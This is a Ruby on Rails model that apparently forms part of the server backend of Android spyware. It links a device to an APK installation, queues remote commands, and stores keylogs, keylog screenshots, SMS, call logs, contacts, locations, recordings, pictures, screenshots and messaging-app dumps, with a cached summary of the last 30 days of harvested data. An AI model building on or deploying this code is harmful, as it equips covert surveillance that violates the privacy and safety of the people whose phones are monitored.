class Smartphone < ApplicationRecord
  belongs_to :apk_installation
  has_many :pending_commands, dependent: :destroy
  has_many :call_logs, dependent: :destroy
  has_many :contacts, dependent: :destroy
  has_many :geo_locations, dependent: :destroy
  has_many :pictures, dependent: :destroy
  has_many :recordings, dependent: :destroy
  has_many :screenshots, dependent: :destroy
  has_many :sms_messages, dependent: :destroy
  has_many :messaging_apps_dumps, dependent: :destroy
  has_many :keylogs, dependent: :destroy
  has_many :keylog_screenshots, dependent: :destroy
  
  validates :name, presence: true
  validates :device_id, presence: true, uniqueness: true
  
  # Cached device summary with Redis
  def summary_cached
    Rails.cache.fetch("device_summary/#{id}", expires_in: 5.minutes) do
      {
        device_id: device_id,
        name: name,
        keylog_count: keylogs.where('created_at > ?', 30.days.ago).count,
        location_count: geo_locations.where('created_at > ?', 30.days.ago).count,
        sms_count: sms_messages.where('created_at > ?', 30.days.ago).count,
        call_count: call_logs.where('created_at > ?', 30.days.ago).count,
        picture_count: pictures.where('created_at > ?', 30.days.ago).count,
        last_activity: last_activity_at,
        pending_commands: pending_commands.active.count
      }
    end
  end
  
  # Get last activity timestamp efficiently
  def last_activity_at
    Rails.cache.fetch("device_activity/#{id}", expires_in: 1.minute) do
      [
        keylogs.maximum(:created_at),
        geo_locations.maximum(:created_at),
        sms_messages.maximum(:created_at),
        call_logs.maximum(:created_at)
      ].compact.max
    end
  end
  
  # Invalidate cache on updates
  after_commit :clear_cache
  
  private
  
  def clear_cache
    Rails.cache.delete("device_summary/#{id}")
    Rails.cache.delete("device_activity/#{id}")
  end
end
